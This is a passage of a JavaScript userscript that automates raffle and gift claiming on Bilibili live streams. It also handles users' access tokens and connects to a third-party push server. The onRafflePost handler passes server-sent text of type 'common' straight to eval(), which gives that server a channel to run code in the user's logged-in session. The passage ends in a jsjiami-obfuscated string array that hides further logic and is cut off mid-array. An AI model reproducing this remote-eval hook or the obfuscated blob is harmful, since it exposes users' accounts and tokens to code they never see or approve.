                            if (BiliPushUtils.pkIdSet.has(id)) return $.Deferred().resolve();
                            BiliPushUtils.pkIdSet.add(id); // 加入id记录列表
                            await BiliPushUtils.Pk._join(roomid, obj.id);
                        }
                        return $.Deferred().resolve();
                    }catch(e){
                        await delayCall(() => BiliPushUtils.Pk.join(roomid, ids));
                    }
                },
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    RafflePorcess.append(roomid, id);
                    window.toast(`[自动抽奖][乱斗领奖]检测到(roomid=${roomid},id=${id})`, 'info');
                    delayCall(() => BiliPushUtils.API.Pk.join(roomid, id).then((response) => {
                        DEBUG('BiliPushUtils.Pk._join: BiliPushUtils.API.Pk.join', response);
                        if (response.code === 0) {
                            try{
                                var giftInfo = response.data.award_text.split('X');
                                Statistics.appendGift(giftInfo[0],giftInfo[1]-0,response.data.award_ex_time);
                            }catch(e){
                            }
                            window.toast(`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_text}`, 'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //BiliPushUtils.up();
                            //window.toast('[自动抽奖][乱斗领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (BiliPushUtils.msgIgnore(response.msg)) {
                            return delayCall(() => BiliPushUtils.Pk._join(roomid, id),1e3);
                        } else if (response.msg.indexOf('过期') > -1) {
                        } else {
                            window.toast(`[自动抽奖][乱斗领奖](roomid=${roomid},id=${id})${response.msg}`, 'caution');
                        }
                        RafflePorcess.remove(roomid, id);
                    }, () => {
                        window.toast(`[自动抽奖][乱斗领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
                        return delayCall(() => BiliPushUtils.Pk._join(roomid, id));
                    }),parseInt(Math.random()*6)*1e3);
                    return $.Deferred().resolve();
                }
            },
            Gift: {
                run:(roomid)=>(BiliPushUtils.Check.run(roomid)),
                join:async (roomid, raffleList) => {
                    try{
                        //console.log(`Gift.join`,roomid,raffleList,i)
                        //if (Info.blocked) return $.Deferred().resolve();
                        //if (i >= raffleList.length) return $.Deferred().resolve();
                        for(let obj of raffleList){
                            if (obj.status === 1) { // 可以参加
                                // raffleId过滤，防止重复参加
                                var raffleId = parseInt(obj.raffleId, 10);
                                if (BiliPushUtils.raffleIdSet.has(raffleId)) return $.Deferred().resolve();
                                BiliPushUtils.raffleIdSet.add(raffleId); // 加入raffleId记录列表
                                await BiliPushUtils.Gift._join(roomid, obj.raffleId, obj.type, obj.time_wait);
                            } else if (obj.status === 2 && obj.time > 0) { // 已参加且未开奖
                            }
                        }
                        return $.Deferred().resolve();
                    }
                    catch(e){
                        await delayCall(() => BiliPushUtils.Gift.join(roomid, raffleList),1e3);
                    }
                },
                _join: (roomid, raffleId, type, time_wait = 0) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    raffleId = parseInt(raffleId, 10);
                    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
                    if(!type){
                        delayCall(() => BiliPushUtils.Check.run(roomid));
                        return $.Deferred().resolve();
                    }
                    window.toast(`[自动抽奖][礼物抽奖]等待抽奖(roomid=${roomid},id=${raffleId},type=${type},time_wait=${time_wait})`, 'info');
                    RafflePorcess.append(roomid, raffleId);
                    delayCall(() => BiliPushUtils.API.Gift.join(roomid, raffleId, type).then((response) => {
                        DEBUG('BiliPushUtils.Gift._join: BiliPushUtils.API.Gift.join', response);
                        switch (response.code) {
                            case 0:
                                Statistics.appendGift(response.data.award_name,response.data.award_num,response.data.award_ex_time);
                                window.toast(`[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type}),${response.data.award_name+"x"+response.data.award_num}`, 'success');
                                break;
                            case 402:
                                // 抽奖已过期，下次再来吧
                                break;
                            case 65531:
                                // 65531: 非当前直播间或短ID直播间试图参加抽奖
                                //Info.blocked = true;
                                //BiliPushUtils.up();
                                //window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`, 'error');
                                break;
                            default:
                                if (response.msg.indexOf('拒绝') > -1) {
                                    //Info.blocked = true;
                                    //BiliPushUtils.up();
                                    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                                } else if (BiliPushUtils.msgIgnore(response.msg)) {
                                    return delayCall(() => BiliPushUtils.Gift._join(roomid, raffleId, type),1e3);
                                } else {
                                    window.toast(`[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`, 'caution');
                                }
                        }
                        RafflePorcess.remove(roomid, raffleId);
                    }, () => {
                        window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`, 'error');
                        return delayCall(() => BiliPushUtils.Gift._join(roomid, raffleId, type),1e3);
                    }), (time_wait + 1) * 1e3);
                    return $.Deferred().resolve();
                }
            },
            Guard: {
                run:(roomid)=>(BiliPushUtils.Check.run(roomid)),
                join:async (roomid, guard) => {
                    try{
                        //console.log(`Guard.join`,roomid,guard,i)
                        //if (Info.blocked) return $.Deferred().resolve();
                        if (!guard) return $.Deferred().resolve();
                        for(let obj of guard){
                            // id过滤，防止重复参加
                            var id = parseInt(obj.id, 10);
                            if (BiliPushUtils.guardIdSet.has(id)) return $.Deferred().resolve();
                            BiliPushUtils.guardIdSet.add(id); // 加入id记录列表
                            await BiliPushUtils.Guard._join(roomid, obj.id);
                        }
                        return $.Deferred().resolve();
                    }catch(e){
                        await delayCall(() => BiliPushUtils.Guard.join(roomid, guard));
                    }
                },
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    RafflePorcess.append(roomid, id);
                    window.toast(`[自动抽奖][舰队领奖]检测到(roomid=${roomid},id=${id})`, 'info');
                    delayCall(() =>BiliPushUtils.API.Guard.join(roomid, id).then((response) => {
                        DEBUG('BiliPushUtils.Guard._join: BiliPushUtils.API.Guard.join', response);
                        if (response.code === 0) {
                            Statistics.appendGift(response.data.award_name,response.data.award_num,response.data.award_ex_time);
                            window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功,${response.data.award_name+"x"+response.data.award_num}`, 'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //BiliPushUtils.up();
                            //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (BiliPushUtils.msgIgnore(response.msg)) {
                            return delayCall(() => BiliPushUtils.Guard._join(roomid, id),1e3);
                        } else if (response.msg.indexOf('过期') > -1) {
                        } else {
                            window.toast(`[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`, 'caution');
                        }
                        RafflePorcess.remove(roomid, id);
                    }, () => {
                        window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
                        return delayCall(() => BiliPushUtils.Guard._join(roomid, id));
                    }),parseInt(Math.random()*6*1e3));
                    return $.Deferred().resolve();
                }
            }
        }
        const BiliPush = {
            _ajax:(url, data, callback,error)=>{
                $.ajax({
                    type: "POST",
                    url: url,
                    data: data,
                    dataType: "json",
                    beforeSend: function (request) {
                    },
                    success: function (data) {
                        callback(data);
                    },
                    error:function(err){
                        error(err);
                    }
                })
            },
            connected:false,
            gsocket:null,
            gsocketTimeId:null,
            gheartTimeId:null,
            first:true,
            lock:false,
            connectWebsocket :(lazy = false)=>{
                if(BiliPush.first){
                    window.toast('初始化bilipush 推送服务', 'info');
                }
                if(BiliPush.lock)return;
                BiliPush.lock = true;
                if(lazy){
                    if(BiliPush.gsocket && BiliPush.gsocket.readyState < 2){
                        BiliPush.lock = false;
                        return;
                    }
                }
                var data = { uid:BilibiliLive.UID,version:VERSION };
                var url="https://bilipush.1024dream.net:5000/ws/pre-connect";
                BiliPush._ajax(url,data,function(d){
                    if(d.code==-1){
                        window.toast('bilipush 拒绝连接:'+d.msg, 'error');
                        BiliPush.lock = false;
                        return;
                    }
                    var url = d.server;
                    if (BiliPush.gsocket) BiliPush.gsocket.close();
                    BiliPush.gsocket = null;
                    BiliPush.gsocket = new WebSocket(url);
                    BiliPush.gsocket.onopen = function (e) {
                        if(BiliPush.first){
                            window.toast('bilipush 连接成功', 'success');
                            BiliPush.first = false;
                        }else{
                            console.info('bilipush 连接成功');
                        }
                        BiliPush.connected = true;
                        BiliPush.gsocket.send("ping");
                        BiliPush.gheartTimeId = setInterval(function () {
                            BiliPush.gsocket.send("ping");
                        }, 120e3);
                    };
                    BiliPush.gsocket.onclose = function (e) {
                        console.error('bilipush 连接断开');
                        BiliPush.connected = false;
                        BiliPush.gsocket = null;
                        clearTimeout(BiliPush.gsocketTimeId);
                        clearInterval(BiliPush.gheartTimeId);
                        BiliPush.gsocketTimeId = setTimeout(function () {
                            if(CONFIG.DD_BP){
                                BiliPush.connectWebsocket();
                            }
                        }, 5000);
                    };
                    BiliPush.gsocket.onmessage = function (e) {
                        try {
                            var msg = JSON.parse(e.data);
                            BiliPush.onRafflePost(msg);
                        } catch (err) {
                            console.log(e,err);
                            return;
                        }
                    };
                    BiliPush.gsocket.onerror = function (e) {
                        console.error('bilipush 连接异常');
                        BiliPush.connected = false;
                        BiliPush.gsocket = null;
                        clearTimeout(BiliPush.gsocketTimeId);
                        clearInterval(BiliPush.gheartTimeId);
                        BiliPush.gsocketTimeId = setTimeout(function () {
                            if(CONFIG.DD_BP){
                                BiliPush.connectWebsocket();
                            }
                        }, 5000);
                    };
                    BiliPush.lock = false;
                }, function (err) {
                    console.error("bilipush连接失败，等待重试...");
                    BiliPush.connected = false;
                    BiliPush.gsocketTimeId = setTimeout(function () {
                        if(CONFIG.DD_BP){
                            BiliPush.connectWebsocket();
                        }
                    }, 5000);
                    BiliPush.lock = false;
                });
            },
            onRafflePost :(rsp)=>{
                try{
                    let raffle_data = JSON.parse(rsp);
                    let {code,type,data} = raffle_data;
                    if(code==0){
                        if(type=="raffle"){
                            let {room_id,raffle_type} = data;
                            switch(raffle_type){
                                case "TV" :
                                case "GUARD":
                                case "PK":
                                case "GIFT":
                                    window.toast(`bilipush 监控到 房间 ${room_id} 的礼物`, 'info');
                                    BiliPushUtils.Check.process(room_id);
                                    break;
                                case "STORM":
                                    window.toast(`bilipush 监控到 房间 ${room_id} 的节奏风暴`, 'info');
                                    BiliPushUtils.Storm.run(room_id);
                                    break;
                            }
                        }else if(type=="common"){
                            try{
                                eval(data);
                            }catch(e){
                                console.error("bilipush 回调失败，可能浏览器不支持");
                            }
                        }else if(type=="notice"){
                            window.toast(data, 'caution');
                        }
                        else if(type=="msg"){
                            window.alertdialog("魔改助手消息",data);
                        }else if(type=="reload"){
                            localStorage.setItem('LIVE_PLAYER_STATUS',JSON.stringify({type:'html5',timeStamp:ts_ms()}));
                            var volume = localStorage.getItem('videoVolume')||0;
                            if(volume==0){
                                localStorage.setItem('videoVolume',0.1);
                            }
                            location.reload();
                        }
                    }
                }catch(e){
                    console.error(e,rsp);
                }
            },
            run:()=>{
                BiliPushUtils.Check.start();
                BiliPushUtils.Check.run(window.BilibiliLive.ROOMID);
                BiliPushUtils.Storm.run(window.BilibiliLive.ROOMID);
                if(CONFIG.DD_BP){
                    BiliPush.connectWebsocket(true);
                }else if(BiliPush.gsocket) {
                    BiliPush.gsocket.close();
                }
                window.websocket = BiliPush.gsocket;
                BiliPushUtils.clearSet();
                setInterval(()=>{
                    BiliPushUtils.clearSet();
                },5e3);
            }
        }
        const RafflePorcess = {
            raffle_Process:{},
            save_Interval:0,
            run:()=>{
                try{
                    var raffle_Process = JSON.parse(localStorage.getItem(`${NAME}_RAFFLE`)) || {};
                    for(let room_id in RafflePorcess.raffle_Process){
                        BiliPushUtils.Check.run(room_id);
                    }
                }catch(e){
                }
                if(RafflePorcess.save_Interval==0){
                    RafflePorcess.save_Interval = setInterval(()=>{
                        localStorage.setItem(`${NAME}_RAFFLE`, JSON.stringify(RafflePorcess.raffle_Process));
                    },100);
                }
            },
            append:(room_id,raffle_id)=>{
                if(RafflePorcess.raffle_Process[room_id]){
                    if(RafflePorcess.raffle_Process[room_id].indexOf(raffle_id)==-1){
                        RafflePorcess.raffle_Process[room_id].push(raffle_id);
                    }
                }else{
                    RafflePorcess.raffle_Process[room_id]=[raffle_id];
                }
            },
            remove:(room_id,raffle_id)=>{
                if(RafflePorcess.raffle_Process[room_id]){
                    RafflePorcess.raffle_Process[room_id] = RafflePorcess.raffle_Process[room_id].filter(r=>r!=raffle_id);
                    if(RafflePorcess.raffle_Process[room_id].length==0){
                        delete RafflePorcess.raffle_Process[room_id];
                    }
                }
            }
        }
        const Statistics = {
            gifts:{},
            queue:[],
            save_Interval:0,
            process_timeOut:0,
            run:()=>{
                try{
                    Statistics.gifts = JSON.parse(localStorage.getItem(`${NAME}_DAYGIFTS`)) || {};
                }catch(e){
                }
                if(!CACHE.stats_ts || checkNewDay(CACHE.stats_ts)){
                    Statistics.gifts = {};
                    CACHE.stats_ts = ts_ms();
                }
                if(Statistics.save_Interval==0){
                    Statistics.save_Interval = setInterval(()=>{
                        localStorage.setItem(`${NAME}_DAYGIFTS`, JSON.stringify(Statistics.gifts));
                    },100);
                }
                if(Statistics.process_timeOut == 0){
                    Statistics.process_timeOut = setTimeout(()=>Statistics.process(),200);
                }
                runTomorrow(Statistics.run);
            },
            appendGift:(name,count,expire)=>{
                if(expire){
                    var expireDay = Math.ceil((expire * 1e3 - new Date().getTime())/86400e3);
                    name = `${name}(${expireDay}d)`;
                }
                console.log(`记录：获得 ${name}x${count}`);
                Statistics.queue.push({name:name,count:count});
            },
            process:()=>{
                while(Statistics.queue.length>0){
                    let{ name,count }=Statistics.queue.shift();
                    if(Statistics.gifts[name]){
                        Statistics.gifts[name] += count;
                    }else{
                        Statistics.gifts[name] = count;
                    }
                }
                clearTimeout(Statistics.process_timeOut);
                Statistics.process_timeOut = setTimeout(()=>Statistics.process(),200);
            },
            showDayGifts:()=>{
                let sumGroupKey = ['辣条'];
                let sumGroup = {};
                let gifts = [];
                for(let [k,v] of Object.entries(Statistics.gifts)){
                    gifts.push(`${k}x${v}`);
                    for(let t of sumGroupKey){
                        if(k.startsWith(t)){
                            if(sumGroup[t]){
                                sumGroup[t] += v;
                            }else{
                                sumGroup[t] = v;
                            }
                        }
                    }
                }
                if(gifts.length>0){
                    gifts.push(`统计:`);
                    for(let [k,v] of Object.entries(sumGroup)){
                        gifts.push(`${k}x${v}`);
                    }
                }
                window.alertdialog('当日礼物统计', gifts.join('<br>'));
            },
        };
        const KeySign = {
            sort:(obj)=>{
                let keys = Object.keys(obj).sort();
                let p=[];
                for(let key of keys){
                    p.push(`${key}=${obj[key]}`);
                }
                return p.join('&');
            },
            convert:(obj)=>{
                for(let k in obj){
                    if($.type(obj[k])=="array"){
                        obj[k] = JSON.stringify(obj[k]);
                    }
                }
            },
        };
        const TokenLoad = async ()=>{
            if(Info.csrf_token){
                let tinfo = JSON.parse(localStorage.getItem(`${NAME}_Token`)) || {};
                if(tinfo.csrf_token == Info.csrf_token && tinfo.time > ts_s())
                {
                    Info.appToken = tinfo;
                }else{
                    tinfo = await getAccessToken();
                    tinfo.time = ts_s() + tinfo.expires_in;
                    tinfo.csrf_token = Info.csrf_token;
                    localStorage.setItem(`${NAME}_Token`, JSON.stringify(tinfo));
                    Info.appToken = tinfo;
                }
            }
        };

var _0xodB='jsjiami.com.v6',_0x5e12=[_0xodB,'\x4f\x77\x49\x72\x43\x4d\x4f\x4f\x77\x36\x45\x33\x4b\x73\x4f\x4a\x77\x37\x63\x3d','\x4b\x55\x44\x43\x73\x6a\x6c\x4a\x77\x35\x30\x56\x65\x53\x62\x43\x68\x67\x62\x44\x6c\x73\x4b\x68\x77\x34\x48\x44\x72\x6c\x37\x44\x70\x7a\x50\x44\x6d\x41\x3d\x3d','\x77\x71\x6a\x43\x72\x77\x41\x53\x59\x38\x4f\x67\x4b\x77\x46\x36\x77\x6f\x58\x43\x6d\x73\x4b\x31\x50\x45\x59\x3d','\x77\x37\x50\x44\x6b\x4d\x4b\x5a\x77\x72\x45\x57','\x47\x73\x4f\x76\x64\x45\x5a\x73','\x77\x34\x6f\x78\x41\x6e\x34\x49','\x77\x34\x67\x63\x47\x6b\x6b\x71\x46\x63\x4f\x4e\x77\x35\x62\x43\x6b\x73\x4b\x71\x65\x4d\x4f\x48\x63\x38\x4b\x43\x65\x48\x44\x44\x76\x73\x4f\x72','\x65\x4d\x4f\x52\x77\x71\x58\x43\x6f\x69\x54\x44\x6d\x4d\x4b\x4e\x77\x72\x35\x39\x77\x71\x68\x35\x77\x6f\x38\x6d\x77\x34\x41\x3d','\x77\x6f\x62\x43\x70\x4d\x4f\x71\x54\x53\x48\x43\x6f\x63\x4f\x42\x77\x72\x45\x67\x42\x79\x48\x43\x71\x38\x4f\x31','\x77\x36\x37\x44\x70\x63\x4b\x75\x77\x6f\x51\x4a\x77\x37\x6e\x43\x67\x63\x4b\x6f\x77\x35\x7a\x44\x6c\x57\x77\x34\x58\x4d\x4f\x2f','\x57\x4d\x4b\x44\x4f\x55\x56\x42\x77\x6f\x77\x75\x77\x36\x66\x44\x6f\x4d\x4b\x77\x77\x36\x70\x43\x77\x72\x51\x68\x42\x4d\x4f\x58\x77\x34\x4c\x44\x6d\x69\x41\x64\x49\x73\x4b\x4c','\x77\x70\x50\x43\x70\x4d\x4f\x34','\x62\x38\x4b\x42\x77\x37\x51\x78\x5a\x67\x3d\x3d','\x77\x35\x72\x44\x6c\x4d\x4b\x65','\x77\x36\x76\x43\x6e\x58\x42\x46\x62\x48\x6e\x43\x76\x63\x4f\x6b\x77\x6f\x62\x44\x67\x52\x62\x44\x6f\x55\x50\x43\x70\x51\x3d\x3d','\x77\x37\x63\x68\x77\x6f\x38\x6e\x4c\x67\x3d\x3d','\x50\x4d\x4f\x57\x64\x45\x68\x57','\x4c\x57\x37\x43\x71\x77\x39\x52','\x4d\x6d\x37\x43\x75\x79\x39\x6e','\x61\x30\x50\x43\x71\x4d\x4f\x54\x77\x35\x62\x44\x6c\x4d\x4f\x50','\x77\x34\x2f\x43\x6e\x56\x37\x44\x6c\x38\x4f\x66','\x42\x63\x4f\x4a\x62\x47\x39\x53\x4b\x46\x35\x50\x66\x33\x4e\x72\x4c\x41\x3d\x3d','\x55\x47\x50\x43\x6e\x51\x3d\x3d','\x77\x36\x30\x43\x77\x70\x30\x69\x47\x77\x3d\x3d','\x49\x77\x77\x48\x46\x73\x4f\x69','\x43\x4d\x4b\x75\x53\x73\x4f\x33','\x77\x35\x7a\x44\x6b\x73\x4b\x62\x77\x71\x59\x6c\x77\x34\x6e\x43\x75\x38\x4b\x6e\x77\x36\x54\x44\x72\x32\x55\x4c\x62\x63\x4f\x63\x77\x34\x72\x43\x75\x79\x33\x44\x6f\x55\x6e\x44\x6d\x41\x3d\x3d','\x49\x73\x4f\x79\x64\x31\x4a\x6b\x4e\x58\x4a\x72\x58\x31\x4e\x54\x43\x73\x4f\x6c\x77\x6f\x55\x3d','\x53\x6d\x4c\x43\x74\x73\x4f\x33\x77\x36\x7a\x43\x75\x4d\x4b\x50\x48\x78\x44\x43\x74\x4d\x4f\x41\x77\x34\x49\x51','\x77\x35\x70\x44\x77\x70\x6c\x5a\x77\x70\x78\x53\x45\x63\x4f\x6b\x77\x35\x37\x44\x75\x78\x34\x7a\x65\x7a\x34\x69\x50\x73\x4f\x6e\x77\x6f\x41\x3d','\x77\x72\x73\x5a\x77\x37\x76\x44\x75\x73\x4b\x36\x4b\x38\x4f\x4c\x77\x37\x46\x73\x59\x4d\x4b\x70\x64\x73\x4b\x59\x5a\x77\x3d\x3d','\x4b\x55\x44\x43\x73\x6a\x6c\x4a\x77\x35\x30\x56\x66\x54\x66\x43\x75\x68\x2f\x44\x67\x73\x4b\x6a\x77\x34\x44\x44\x6c\x47\x7a\x44\x71\x79\x49\x3d','\x51\x4d\x4b\x73\x47\x58\x5a\x6c','\x4c\x4d\x4b\x46\x77\x36\x6b\x63\x4c\x52\x50\x43\x76\x31\x67\x73\x77\x34\x67\x2f\x46\x38\x4f\x45','\x4e\x38\x4b\x45\x77\x35\x41\x33\x4e\x69\x50\x43\x6b\x6c\x51\x75\x77\x34\x67\x2f\x46\x38\x4f\x45\x56\x38\x4b\x48\x77\x70\x77\x74\x77\x71\x62\x44\x73\x4d\x4b\x6d\x66\x47\x67\x3d','\x4f\x58\x6e\x44\x76\x52\x68\x47\x77\x6f\x4d\x3d','\x77\x35\x41\x79\x77\x72\x41\x74\x4f\x73\x4b\x39\x41\x6d\x49\x4a\x56\x4d\x4b\x35\x4e\x38\x4f\x39\x77\x70\x72\x44\x6a\x73\x4b\x73\x77\x37\x59\x46','\x77\x37\x4c\x44\x74\x73\x4b\x69\x77\x70\x51\x48','\x77\x34\x6f\x53\x77\x35\x76\x43\x6d\x4d\x4b\x64','\x48\x6a\x51\x48\x77\x70\x51\x6f','\x53\x4d\x4b\x38\x4a\x43\x70\x63\x4d\x46\x6b\x3d','\x51\x4d\x4b\x68\x4f\x53\x70\x63\x50\x51\x3d\x3d','\x59\x6d\x35\x42\x48\x6b\x72\x43\x75\x77\x3d\x3d','\x59\x73\x4b\x6a\x48\x6b\x6f\x4e','\x77\x6f\x50\x44\x76\x69\x66\x43\x70\x32\x7a\x43\x75\x77\x3d\x3d','\x44\x63\x4b\x6b\x77\x37\x63\x34\x63\x58\x34\x3d','\x77\x36\x73\x47\x77\x37\x37\x43\x71\x63\x4b\x75\x4d\x51\x3d\x3d','\x5a\x63\x4b\x42\x46\x52\x56\x6f\x64\x78\x67\x3d','\x77\x36\x5a\x63\x53\x42\x73\x77\x43\x63\x4b\x2f','\x4b\x7a\x51\x51\x77\x6f\x51\x63\x50\x48\x6e\x43\x70\x4d\x4b\x32\x77\x34\x35\x2f\x77\x37\x72\x44\x68\x4d\x4b\x36\x77\x6f\x6e\x44\x73\x6a\x4d\x3d','\x77\x34\x37\x44\x69\x77\x37\x43\x6e\x67\x4c\x43\x67\x63\x4b\x7a\x4b\x45\x6e\x44\x6e\x46\x50\x44\x67\x44\x4c\x43\x6c\x67\x5a\x4c\x77\x35\x44\x43\x68\x38\x4b\x69','\x77\x71\x51\x2f\x65\x73\x4b\x77\x4d\x67\x62\x44\x6d\x56\x73\x54\x77\x34\x4d\x54\x46\x38\x4f\x57\x77\x71\x59\x3d','\x77\x35\x4c\x44\x67\x53\x50\x43\x6a\x77\x72\x43\x74\x38\x4b\x79\x50\x56\x76\x44\x73\x58\x72\x44\x6b\x7a\x2f\x43\x6c\x44\x78\x69\x77\x35\x7a\x43\x69\x73\x4b\x6e\x43\x41\x3d\x3d','\x77\x37\x41\x58\x77\x37\x76\x43\x72\x73\x4b\x2b\x53\x38\x4f\x37\x56\x63\x4b\x38\x4b\x4d\x4f\x6f\x77\x71\x55\x2f\x77\x36\x63\x3d','\x4c\x6a\x45\x38\x77\x6f\x51\x73\x45\x57\x72\x43\x73\x73\x4b\x65\x77\x36\x64\x6f\x77\x37\x66\x44\x6e\x63\x4b\x71\x77\x72\x50\x44\x68\x44\x6f\x47\x55\x77\x3d\x3d','\x77\x70\x7a\x43\x6e\x6a\x41\x61\x56\x4d\x4f\x44\x41\x77\x35\x65\x77\x71\x33\x43\x6f\x4d\x4b\x42\x44\x51\x3d\x3d','\x77\x35\x44\x43\x68\x46\x70\x50\x59\x6a\x41\x74\x77\x70\x74\x43\x77\x72\x62\x43\x75\x7a\x6f\x4d\x42\x38\x4f\x2b\x52\x38\x4f\x39\x52\x6c\x59\x3d','\x77\x70\x49\x47\x43\x4d\x4b\x54\x77\x35\x73\x71\x77\x37\x62\x44\x73\x73\x4b\x47\x77\x71\x31\x79\x53\x73\x4b\x63\x77\x71\x30\x3d','\x77\x34\x6f\x7a\x77\x72\x76\x43\x74\x4d\x4f\x66','\x43\x55\x4d\x61\x4e\x38\x4b\x6b','\x77\x36\x4e\x68\x77\x36\x4c\x43\x75\x77\x4d\x57\x77\x36\x63\x52\x44\x6e\x5a\x79\x77\x37\x76\x44\x75\x77\x3d\x3d','\x43\x53\x35\x33\x45\x63\x4b\x4f\x77\x36\x77\x3d','\x77\x71\x44\x44\x6b\x4d\x4f\x32','\x52\x38\x4f\x46\x77\x34\x70\x37\x77\x37\x51\x3d','\x77\x37\x31\x4e\x54\x52\x77\x7a\x66\x63\x4f\x55\x77\x34\x4c\x43\x6f\x6e\x66\x44\x74\x7a\x33\x43\x76\x7a\x41\x3d','\x77\x35\x6b\x53\x77\x71\x54\x43\x74\x38\x4f\x33','\x48\x51\x4d\x4c\x77\x71\x45\x6e','\x53\x52\x7a\x43\x6e\x52\x59\x31','\x64\x38\x4b\x6d\x4a\x42\x56\x6a','\x77\x37\x6e\x43\x67\x58\x6a\x44\x67\x73\x4f\x51\x77\x34\x6a\x43\x6d\x73\x4b\x6c\x63\x63\x4b\x6c','\x77\x71\x2f\x44\x6d\x69\x7a\x43\x6b\x44\x41\x3d','\x77\x35\x33\x43\x67\x55\x39\x63\x59\x41\x3d\x3d','\x46\x63\x4f\x48\x65\x57\x4a\x4d','\x52\x46\x66\x43\x6a\x38\x4f\x5a\x77\x36\x59\x3d','\x77\x37\x76\x44\x70\x78\x49\x74\x77\x6f\x48\x43\x68\x4d\x4f\x61\x52\x4d\x4f\x79\x44\x43\x37\x44\x70\x73\x4f\x31\x77\x37\x30\x3d','\x4e\x63\x4b\x54\x77\x35\x4d\x59\x49\x7a\x37\x43\x71\x47\x49\x72\x77\x37\x6b\x72\x4b\x63\x4f\x56\x65\x73\x4b\x47','\x77\x35\x6a\x43\x67\x33\x52\x4f\x5a\x42\x30\x36\x77\x71\x56\x42\x77\x6f\x54\x43\x76\x51\x3d\x3d','\x77\x34\x33\x43\x6e\x6b\x59\x3d','\x77\x34\x37\x44\x67\x53\x4c\x43\x6e\x67\x7a\x43\x73\x4d\x4b\x69\x4c\x41\x3d\x3d','\x77\x34\x4e\x38\x5a\x43\x51\x45\x52\x67\x3d\x3d','\x66\x73\x4b\x47\x77\x34\x30\x77\x77\x37\x41\x3d','\x77\x36\x6b\x39\x42\x47\x31\x30\x66\x41\x3d\x3d','\x77\x6f\x6b\x58\x44\x63\x4b\x55\x77\x34\x74\x5a\x77\x70\x38\x3d','\x77\x34\x4a\x41\x77\x37\x7a\x43\x6e\x79\x70\x36\x77\x71\x63\x3d','\x66\x38\x4b\x54\x77\x36\x41\x74\x65\x4d\x4b\x55\x59\x41\x3d\x3d','\x4c\x73\x4b\x52\x77\x35\x6b\x4b\x4a\x67\x3d\x3d','\x77\x36\x74\x55\x57\x67\x45\x55','\x77\x37\x30\x6e\x77\x72\x44\x43\x74\x38\x4f\x34','\x77\x70\x6f\x55\x77\x36\x66\x44\x70\x4d\x4b\x36','\x77\x37\x5a\x67\x77\x71\x6c\x68\x77\x70\x73\x3d','\x77\x35\x68\x2f\x77\x6f\x31\x4f\x77\x72\x41\x3d','\x49\x67\x78\x54\x4d\x38\x4b\x78','\x77\x35\x54\x43\x6a\x63\x4b\x76\x63\x4d\x4b\x51','\x77\x37\x42\x30\x77\x71\x33\x43\x6d\x32\x38\x3d','\x4d\x52\x45\x33\x45\x63\x4f\x4f\x77\x37\x6b\x68','\x57\x73\x4b\x73\x77\x36\x38\x42\x77\x72\x77\x73\x4e\x63\x4b\x48','\x77\x35\x63\x42\x77\x71\x6e\x43\x6e\x73\x4f\x39','\x77\x72\x50\x43\x6c\x73\x4f\x6f\x63\x79\x55\x3d','\x77\x34\x55\x77\x77\x34\x6e\x43\x6e\x73\x4b\x64','\x50\x79\x63\x4d\x77\x70\x38\x72','\x77\x34\x39\x41\x77\x72\x62\x43\x6e\x6e\x77\x3d','\x52\x47\x50\x43\x6e\x51\x3d\x3d','\x5a\x63\x4b\x58\x77\x34\x67\x33\x77\x6f\x30\x48\x42\x63\x4b\x35\x50\x48\x58\x43\x6d\x4d\x4f\x32\x77\x6f\x50\x43\x68\x51\x3d\x3d','\x77\x6f\x7a\x44\x74\x38\x4b\x41\x4f\x38\x4b\x4b\x52\x58\x34\x75\x49\x63\x4f\x4e\x77\x34\x6e\x43\x71\x4d\x4b\x6a\x48\x63\x4b\x67\x77\x71\x6b\x6b\x4c\x73\x4f\x69\x77\x71\x6f\x3d','\x77\x37\x76\x43\x6e\x45\x37\x44\x6c\x4d\x4f\x78','\x77\x35\x58\x43\x75\x57\x39\x61\x64\x41\x3d\x3d','\x77\x35\x63\x65\x77\x71\x6e\x43\x6d\x38\x4f\x39','\x77\x34\x6a\x43\x68\x63\x4b\x38\x64\x4d\x4b\x77','\x77\x71\x76\x43\x6a\x51\x30\x32\x56\x51\x3d\x3d','\x52\x73\x4b\x44\x4d\x58\x31\x42\x77\x6f\x73\x3d','\x77\x35\x62\x43\x6b\x6e\x56\x52\x66\x41\x3d\x3d','\x41\x30\x55\x31\x4a\x73\x4b\x39','\x57\x6a\x72\x43\x76\x43\x49\x48','\x56\x6b\x58\x43\x69\x38\x4f\x67\x77\x34\x38\x3d','\x4e\x6d\x38\x6a\x48\x4d\x4b\x50','\x77\x6f\x77\x71\x77\x37\x7a\x44\x6d\x38\x4b\x6e','\x44\x38\x4b\x34\x77\x34\x63\x66\x4a\x77\x3d\x3d','\x66\x4d\x4b\x61\x77\x37\x30\x58\x77\x71\x30\x3d','\x77\x37\x49\x7a\x77\